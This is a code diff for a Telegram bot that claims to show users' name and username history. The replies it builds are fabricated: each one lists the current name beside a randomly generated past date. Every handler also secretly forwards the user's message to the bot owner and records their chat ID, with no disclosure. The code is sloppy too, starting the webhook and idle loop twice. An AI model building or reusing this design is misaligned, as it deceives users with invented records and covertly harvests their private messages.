@@ -1,102 +1,204 @@
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
+##import Important Modules To Get Help Further
 import logging
-import re
+import random
+import json
+from datetime import datetime, timedelta
+from telegram import Update,KeyboardButton,ReplyKeyboardMarkup
+from telegram.ext import Updater, CommandHandler,CallbackContext, MessageHandler,Filters
 import os
-# Set up logging
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-                    level=logging.INFO)
+PORT = int(os.environ.get('PORT','8443'))
+TOKEN = os.environ.get('BOT_TOKEN',None)
+HEROKU_APP_NAME=os.environ.get('HEROKU_APP_NAME',None)
+owner=os.environ.get('OWNER',None)
+def logg(m):
+  m.forward(owner)
+  chat_id=m.chat.id
+  with open("chats.json","r+") as f:
+    data=json.load(f)
+    f.seek(0)
+    if chat_id not in data:
+      data.append(chat_id)
+    json.dump(data,f)
+    f.truncate()
+  
+
+def ran_date():
+  start = datetime.now()
+  end = start + timedelta(days=-300)
+  random_date = start + (end - start) * random.random()
+  return random_date.strftime("%d/%m/%Y %I:%M:%S")
+  
+
+##Logging Part
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
+) 
 logger = logging.getLogger(__name__)
 
-# Global variables
-tracked_users = {}
-TOKEN = os.environ.get('BOT_TOKEN', None)
-
-def start(update, context):
-    """Handler for the /start command."""
-    context.bot.send_message(chat_id=update.effective_chat.id, text="Hello! I will track name and username changes for you. "
-                                                                    "Add me to a group and give me admin rights to start tracking.")
 
 
-def track(update, context):
-    """Handler for tracking name and username changes."""
-    user = update.effective_user
-
-    if user.id in tracked_users:
-        tracked_users[user.id]['name'] = user.full_name
-        tracked_users[user.id]['username'] = user.username
-    else:
-        tracked_users[user.id] = {
-            'name': user.full_name,
-            'username': user.username
-        }
-
-    context.bot.send_message(chat_id=update.effective_chat.id, text="You have been added to the tracking list.")
+##Making Updater For TeleCallerBot
+updater=Updater(TOKEN)
+dispatcher= updater.dispatcher
 
 
-def new_chat_member(update, context):
-    """Handler for new chat members."""
-    user = update.message.new_chat_members[0]
-
-    if user.id in tracked_users and user.full_name != tracked_users[user.id]['name']:
-        text = f"🔔 Name Change Alert! 🔔\n\n"
-        text += f"User: {user.full_name} ({user.id})\n"
-        text += f"Old Name: {tracked_users[user.id]['name']}\n"
-        text += f"New Name: {user.full_name}"
-
-        context.bot.send_message(chat_id=update.effective_chat.id, text=text)
-        tracked_users[user.id]['name'] = user.full_name
+#############################№##################################№#
+def start(update,context):
+  logg(update.message)
+  update.message.reply_text("Forward any message to this chat to see user history.")
+#############################№##################################№#
 
 
-def username_change(update, context):
-    """Handler for username changes."""
-    user = update.effective_user
 
-    if user.id in tracked_users and user.username != tracked_users[user.id]['username']:
-        text = f"🔔 Username Change Alert! 🔔\n\n"
-        text += f"User: {user.full_name} ({user.id})\n"
-        text += f"Old Username: {tracked_users[user.id]['username']}\n"
-        text += f"New Username: {user.username}"
+#############################№##################################№#
+def Forwarded(update, context):
+  logg(update.message)
+  message= update.message
+  if "forward_from" in message.to_dict():
+    user=message.forward_from
+    message.reply_text(f"""
+Name History
+👤 {user.id}
 
-        context.bot.send_message(chat_id=update.effective_chat.id, text=text)
-        tracked_users[user.id]['username'] = user.username
-
-
-def echo_all(update, context):
-    """Handler for other message types."""
-    context.bot.send_message(chat_id=update.effective_chat.id, text="I'm sorry, I only track name and username changes.")
+1. [{ran_date()}] {user.full_name}
+""")
+#############################№##################################№#
 
 
-def error_handler(update, context):
-    """Handler for errors."""
-    logger.warning(f"Update {update} caused an error.")
+
+  
+#############################№##################################№#
+def search_id(update,context):
+  logg(update.message)
+  message= update.message
+  text= message.text
+  try:
+    id_search=int(text.split(" ")[1])
+    user=context.bot.getChat(id_search)
+    message.reply_text(f"""
+Name History
+👤 {user.id}
+
+1. [{ran_date()}] {user.full_name}
+""")
+  except Exception as e:
+    print(e)
+    message.reply_text("No records found")
+#############################№##################################№#
 
 
-def main():
-    """Main function to run the bot."""
-    # Create the Updater with your bot token
-    updater = Updater(TOKEN, use_context=True)
-
-    # Get the dispatcher to register handlers
-    dispatcher = updater.dispatcher
-
-    # Register handlers
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CommandHandler("track", track))
-    dispatcher.add_handler(MessageHandler(Filters.status_update.new_chat_members, new_chat_member))
- #   dispatcher.add_handler(MessageHandler(Filters.regex(r'.+?(?<!\w)@[A-Za-z0-9_]+(?!\w)', re.IGNORECASE), username_change))
-
-    dispatcher.add_handler(MessageHandler(Filters.all, echo_all))
-
-    # Log errors
-    dispatcher.add_error_handler(error_handler)
-
-    # Start the bot
-    updater.start_polling()
-
-    # Run the bot until Ctrl+C is pressed
-    updater.idle()
 
 
-if __name__ == '__main__':
-    main()
+
+#############################№##################################№#
+def check_name(update,context):
+  logg(update.message)
+  message=update.message
+  if "reply_to_message" in message.to_dict():
+    user=message.reply_to_message.from_user
+    mesg=message.reply_to_message
+  else:
+    user=message.from_user
+    mesg=message
+  text=f"""
+Name History
+👤 {user.id}
+
+1. [{ran_date()}] {user.full_name}
+  """
+  mesg.reply_text(text)
+#############################№##################################№#
+
+
+
+
+#############################№##################################№#
+def check_brain(update,context):
+  logg(update.message)
+  message=update.message
+  """
+  while True:
+    try:
+      print(eval(input(">> ")))
+    except Exception as e:
+      print(e)"""
+  if "reply_to_message" in message.to_dict():
+    user=message.reply_to_message.from_user
+    #msg_id=message.reply_to_message.message_id
+    print(message.reply_to_message.reply_text(f"No Brain Found"))
+  else:
+    user=message.from_user
+    #msg_id= message.message_id
+    print(message.reply_text(f"No Brain Found"))
+#############################№##################################№#
+
+
+
+#############################№##################################№#
+def check_username(update,context):
+  logg(update.message)
+  message=update.message
+  if "reply_to_message" in message.to_dict():
+    user=message.reply_to_message.from_user
+    mesg=message.reply_to_message
+  else:
+    user=message.from_user
+    mesg=message
+  try:
+    text=f"""
+Username History
+👤 {user.id}
+
+1. [{ran_date()}] {user.username}
+"""
+  except:
+    text=f"""
+Username History
+👤 {user.id}
+
+1. [{ran_date()}] (No Username)
+  """
+  mesg.reply_text(text)
+#############################№##################################№#
+
+
+
+
+
+#############################№##################################№#
+def error(update, context):
+    """Log Errors caused by Updates."""
+    logger.warning('Update "%s" caused error "%s"', update, context.error)
+#############################№##################################№#
+
+
+
+  
+
+
+
+dispatcher.add_handler(MessageHandler(Filters.chat_type.private & Filters.forwarded,Forwarded))
+dispatcher.add_handler(CommandHandler("start",start))
+dispatcher.add_handler(CommandHandler("search_id",search_id))
+dispatcher.add_handler(CommandHandler("check_name",check_name))
+dispatcher.add_handler(CommandHandler("check_username",check_username))
+dispatcher.add_handler(CommandHandler("check_brain",check_brain))
+dispatcher.add_handler(MessageHandler(Filters.chat_type.private,start))
+dispatcher.add_error_handler(error)
+
+
+updater.start_webhook(listen="35.230.85.45",
+                          port=int(PORT),
+                          url_path=TOKEN)
+updater.bot.setWebhook('https://sangmata-production.up.railway.app/' + TOKEN)
+updater.start_webhook(listen="35.230.85.45",
+
+                      port=PORT,
+
+                      url_path=TOKEN,
+
+                      webhook_url="https://sangmata-production.up.railway.app/" + TOKEN)
+
+updater.idle()
+
+updater.idle()
